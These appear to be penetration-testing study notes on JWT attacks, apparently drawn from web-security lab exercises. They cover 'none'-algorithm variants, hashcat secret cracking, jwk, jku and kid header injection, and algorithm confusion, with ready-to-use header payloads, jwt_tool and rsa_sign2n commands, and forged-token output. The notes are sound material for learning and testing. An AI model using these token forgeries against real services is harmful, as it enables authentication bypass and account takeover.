# Content 
- [jwt structure](#jwt-structure)
- [Accepting arbitrary signatures](#accepting-arbitrary-signatures)
- [Accepting tokens with no signature](#accepting-tokens-with-no-signature)
- [Brute-forcing secret keys](#brute-forcing-secret-keys)
- [JWT header parameter injections](#jwt-header-parameter-injections)
  - [Injecting self-signed JWTs via the jwk parameter](#injecting-self-signed-jwts-via-the-jwk-parameter)
  - [Injecting self-signed JWTs via the jku parameter](#injecting-self-signed-jwts-via-the-jku-parameter)
  - [Injecting self-signed JWTs via the kid parameter](#injecting-self-signed-jwts-via-the-kid-parameter)
- [Algorithm confusion attacks](#algorithm-confusion-attacks)




## jwt structure
1) Header



| Header Parameter | Description                                             |
|------------------|---------------------------------------------------------|
| `alg`                        | Algorithm used for signing/verifying the token (e.g., HS256).     |
| `typ`                        | Type of the token (usually "JWT").                     |
| `cty`                        | Content Type, indicating the media type of the token.  |
| `kid` (Key ID)               | Key ID, used to identify the key for verification.      |
| `jwk` (JSON Web Key)         | Provides an embedded JSON object representing the key.                                |
| `jku` (JSON Web Key Set URL) | Provides a URL from which servers can fetch a set of keys containing the correct key. |



2) Payload
- Registered Claims


| Claim             | Description                                                |
|-------------------|------------------------------------------------------------|
| `iss` (Issuer)    | The entity that issued the JWT.                            |
| `sub` (Subject)   | The subject of the JWT, often a user ID.                   |
| `aud` (Audience)  | The intended audience for the JWT.                        |
| `exp` (Expiration) | The time after which the token should not be accepted.   |
| `nbf` (Not Before) | The time before which the token should not be accepted. |
| `iat` (Issued At) | The time at which the JWT was issued.                     |
| `jti` (JWT ID)     | A unique identifier for the token.                         |

- **Public claims:** are intended for use across different applications or by multiple parties.
- **Private Claims:** are specific to a particular application, organization, or use case, and their names are not required to follow standardized conventions.  

3) Signature


JWT token Example : 
```jwt
Header: {
  "alg": "HS256",
  "typ": "JWT"
}

Payload: {
  "iss": "example.com",
  "sub": "1234567890",
  "aud": "myapp",
  "exp": 1677648242,
  "nbf": 1677644642,
  "iat": 1677644642,
  "jti": "a1b2c3d4e5"
  // Custom claims:
  "username": "johndoe",
  "role": "admin"
}

Signature: (Generated using the HMAC-SHA256 algorithm)

```

## Accepting arbitrary signatures
- edit `sub` to another user ex:admin 
- sign the jwt token and send it

## Accepting tokens with no signature
- Setting the alg parameter to "none" is discouraged due to its inherent security risks. 
- Many servers reject unsigned tokens to prevent vulnerabilities. 
- This filtering is based on string parsing, making it possible to bypass such filters using obfuscation techniques like mixed capitalization and unexpected encodings.
```
None
none
NONE

```
## Brute-forcing secret keys
- [jwt secrets list](https://github.com/wallarm/jwt-secrets/blob/master/jwt.secrets.list)
```shell
hashcat -a 0 -m 16500 <jwt> <wordlist> --show

=> <jwt>:<identified-secret>
```


# JWT header parameter injections
## Injecting self-signed JWTs via the jwk parameter
- servers should only use a limited whitelist of public keys to verify JWT signatures.
- misconfigured servers sometimes use any key that's embedded in the jwk parameter.
- You can exploit this behavior by signing a modified JWT using your own RSA private key, then embedding the matching public key in the jwk header.

```json
{
    "kid": "28efc4b6-122a-41ae-9c22-f162a3f4266f",
    "typ": "JWT",
    "alg": "RS256",
    "jwk": {
        "kty": "RSA",
        "e": "AQAB",
        "kid": "28efc4b6-122a-41ae-9c22-f162a3f4266f",
        "n": "qFS9f6gM6Ez6GuNQPJEHfVnwKXE0B7kUIWs4DWigfKx2fNoi5_N72_y4r2OB2IZn0PFBswo1QFTAIVCHqwEMozN16yVWkoRIwzfVeXj7cpTlr7JpWVvbkiEM0SkMgAvP0Rm2wua7d79C5KIQy6kCD7u63Ma45i0EIxpBDqFK788"
    }
}
```
- `e`: The public exponent of the RSA key.
- `n`: The modulus of the RSA key.
- `kid` in the header matches the `kid` in the `jwk`

## Injecting self-signed JWTs via the jku parameter
- some servers let you use the jku (JWK Set URL) header parameter to reference a JWK Set containing the key.
- More secure websites will only fetch keys from trusted domains, but you can sometimes take advantage of URL parsing discrepancies to bypass this kind of filtering.
- You can exploit this behavior by signing a modified JWT using your own RSA private key, then embedding `jku` pointing to a url containing the public key (make sure the `kid` is the same at both).

example of exploit:
```json
{
    "jku": "https://exploit-0a97008704342d7880177f19017b0059.exploit-server.net/exploit.json",
    "kid": "80ee234a-f38f-49f2-9608-7388e11db35e",
    "alg": "RS256"
}
```


example of the file containing the keys :
```json
{
    "keys": [
        {
            "kty": "RSA",
            "e": "AQAB",
            "kid": "80ee234a-f38f-49f2-9608-7388e11db35e",
            "n": "o-yy1wpYmffgXBxhAUJzHHocCuJolwDqql75ZWuCQ_cb33K2vh9mk6GPM9gNN4Y_qTVX67WhsN3JvaFYw-fhvsWQ"
        },
        {
            "kty": "RSA",
            "e": "AQAB",
            "kid": "d8fDFo-fS9-faS14a9-ASf99sa-7c1Ad5abA",
            "n": "fc3f-yy1wpYmffgXBxhAUJzHql79gNNQ_cb33HocCuJolwDqmk6GPM4Y_qTVX67WhsN3JvaFYw-dfg6DH-asAScw"
        }
    ]
}
```
- JWK Sets like this are sometimes exposed publicly via a standard endpoint, such as `/.well-known/jwks.json`.

## Injecting self-signed JWTs via the kid parameter
- `kid` parameter may point to a particular entry in a database, or a name of a file
- If this parameter is also vulnerable to directory traversal, an attacker could potentially force the server to use an arbitrary file from its filesystem as the verification key.
  - if the server also supports JWTs signed using a **symmetric algorithm**.
  - point the `kid` parameter to a predictable, static file, EX: `/dev/null`
  - sign the JWT using a secret that matches the contents of this file.  
```json
{
    "kid": "../../path/to/file",
    "typ": "JWT",
    "alg": "HS256",
    "k": "asGsADas3421-dfh9DGN-AFDFDbasfd8-anfjkvc"
}
```
- the `kid` header parameter is also a potential vector for **SQL injection** attacks. 

## Algorithm confusion attacks
#### 1) **Obtain the server's public key**

Servers sometimes expose their public keys as JSON Web Key (JWK) objects via a standard endpoint mapped to `/jwks.json` or `/.well-known/jwks.json`

#### 2) **Convert the public key to a suitable format**

- In order for the attack to work, the version of the key that you use to sign the JWT must be identical to the server's local copy. 
- In addition to being in the same format, every single byte must match, including any non-printing characters.
- [Example](https://portswigger.net/web-security/jwt/algorithm-confusion#step-2-convert-the-public-key-to-a-suitable-format)

#### 3) **Modify your JWT**

Once you have the public key in a suitable format, you can modify the JWT however you like. Just make sure that the `alg` header is set to `HS256`. 

#### 4) **Sign the JWT using the public key**

Sign the token using the HS256 algorithm with the RSA public key as the secret. 

```bash
jwt_tool JWT_HERE -X k -pk my_public.pem
```

## Algorithm confusion attacks with no public key

- in [rsa_sign2n](https://github.com/silentsignal/rsa_sign2n) check `jwt_forgery.py`



put 2 jwt , you will have 2 certs with 2 jwt one of them should work
```
python3 jwt_forgery.py eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJ1c2VyIjoiYWEiLCJpYXQiOjE3MjAyMjI0ODd9.L7js5GLdLGny4sZEOK_2xt-Gu3FsQejhmT-AjIR8CxOXxPAOmG7xY3yWvtp4AgI4yZqLtz9jZz2S5ubxjNky10joZZDFXI0cfv4bIZ6QFKhI738V7NubA9iFL1yBZ5E4NoMsGN7ekpoZB4b5KBp2KT3DqWWudLyAy63UdA2XsOejSlbfcCU_RAkAseXRaQcLmE0ybNlK_WvFEN4tC7QwbsotToH7ndn350jlPwU6cWwXrg_oTZaGdOGrDgAYctw4ILWAfgOc6ANLhh_eZDuZRp8LVoT-dHbrgPJPGJrD4mWX75jicDO5U6-W_JSWXguav7C97sJARXW3ReGzuS7pPg  eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJ1c2VyIjoiYWFhYSIsImlhdCI6MTcyMDIyMzY4NH0.XwGhhJQ02Ez4-zVCbeKq__OfbwRq7hGDvRKTqDu_nv9xX1RDIHm0tYPjLiI3WtP6VaXQ-8_K4ErjzFBxJ4PHxMcM6HihXzQF0quayZOT1LjiDCWRJo-mWC4n-jTYIoJlpJ4sQfVywrJ8qm4zPEBzecrDvp9lemlw9m-7wNMAeSr4CYlHFL_OhrjP0MEDuntt1TS1hHE8hbirwnQuNIgV6xkt5qKdOjfMS-HlbCoWNiYCbq34uNwh6W4eHiydF7ehJveJLHqyYz7MSnca7mi-sZ1M9L5ffEBaXjaT1WsF2B85r0YdilaBIBcIumjJs2xEJZIv7-NFK9Buv1Z0Xw70xg 

[*] GCD:  0x1
[*] GCD:  0xae3c9b34d4b7493f157d4a00221be5649b4db3db60d0adbe6c0a7236d716bc60ff6d11099c8d6a95cd093a817c67ccce112829268ae0487b0f1fabfe86039edc120d84eb61ae211b6a687b195188f5c4064850c79dc0e2b9a005726318b7e386886db0233289f6786be90c40e64dca010ff9c4030c50af2800e2d41b52506337c292d1a9722487cbdd35da39a1b33517a09e4c429067c85543e986b760cff5a565964953318251efe95d2f1c08fcefcf8e14b6015a9e65756cc0b45ff47fb5c3294d09aa1e1f1127ef3d027907f1c393c58cce158d118c6cee5640bc9aa6d2172d0e0052f62d568fdf39b7e2dacee9eaac72d0b08bb4c8fa129f7585608fbd63
[+] Found n with multiplier 1  :
 0xae3c9b34d4b7493f157d4a00221be5649b4db3db60d0adbe6c0a7236d716bc60ff6d11099c8d6a95cd093a817c67ccce112829268ae0487b0f1fabfe86039edc120d84eb61ae211b6a687b195188f5c4064850c79dc0e2b9a005726318b7e386886db0233289f6786be90c40e64dca010ff9c4030c50af2800e2d41b52506337c292d1a9722487cbdd35da39a1b33517a09e4c429067c85543e986b760cff5a565964953318251efe95d2f1c08fcefcf8e14b6015a9e65756cc0b45ff47fb5c3294d09aa1e1f1127ef3d027907f1c393c58cce158d118c6cee5640bc9aa6d2172d0e0052f62d568fdf39b7e2dacee9eaac72d0b08bb4c8fa129f7585608fbd63
[+] Written to ae3c9b34d4b7493f_65537_x509.pem
[+] Tampered JWT: b'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjogImFhIiwgImlhdCI6IDE3MjAyMjI0ODcsICJleHAiOiAxNzIwMzEwMTQ0fQ.w-haA5ngSpOHhKHVKrpnul1pMlcRgInM12Q0ngdP_SY'
[+] Written to ae3c9b34d4b7493f_65537_pkcs1.pem
[+] Tampered JWT: b'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjogImFhIiwgImlhdCI6IDE3MjAyMjI0ODcsICJleHAiOiAxNzIwMzEwMTQ0fQ.priluS7J6ZinqDf6NyNWGk3o0OfXg69z6VViL3FhGRI'
================================================================================
Here are your JWT's once again for your copypasting pleasure
================================================================================
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjogImFhIiwgImlhdCI6IDE3MjAyMjI0ODcsICJleHAiOiAxNzIwMzEwMTQ0fQ.w-haA5ngSpOHhKHVKrpnul1pMlcRgInM12Q0ngdP_SY
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjogImFhIiwgImlhdCI6IDE3MjAyMjI0ODcsICJleHAiOiAxNzIwMzEwMTQ0fQ.priluS7J6ZinqDf6NyNWGk3o0OfXg69z6VViL3FhGRI
```
base64 the cert which is working 
```
cat ae3c9b34d4b7493f_65537_pkcs1.pem | base64 -w 0 
LS0tLS1CRUdJTiBSU0EgUFVCTElDIEtFWS0tLS0tCk1JSUJDZ0tDQVFFQXJqeWJOTlMzU1Q4VmZVb0FJaHZsWkp0TnM5dGcwSzIrYkFweU50Y1d2R0QvYlJFSm5JMXEKbGMwSk9vRjhaOHpPRVNncEpvcmdTSHNQSDZ2K2hnT2UzQklOaE90aHJpRWJhbWg3R1ZHSTljUUdTRkRIbmNEaQp1YUFGY21NWXQrT0dpRzJ3SXpLSjluaHI2UXhBNWszS0FRLzV4QU1NVUs4b0FPTFVHMUpRWXpmQ2t0R3BjaVNICnk5MDEyam1oc3pVWG9KNU1RcEJueUZWRDZZYTNZTS8xcFdXV1NWTXhnbEh2NlYwdkhBajg3OCtPRkxZQldwNWwKZFd6QXRGLzBmN1hES1UwSnFoNGZFU2Z2UFFKNUIvSERrOFdNemhXTkVZeHM3bFpBdkpxbTBoY3REZ0JTOWkxVwpqOTg1dCtMYXp1bnFySExRc0l1MHlQb1NuM1dGWUkrOVl3SURBUUFCCi0tLS0tRU5EIFJTQSBQVUJMSUMgS0VZLS0tLS0K
```

then go to burp generate symtric key ,  and change the k value with the encoded cert
![jwt](https://github.com/kiro6/penetration-testing-notes/assets/57776872/5571ceb3-4063-4037-8fe6-a188bdfec832)
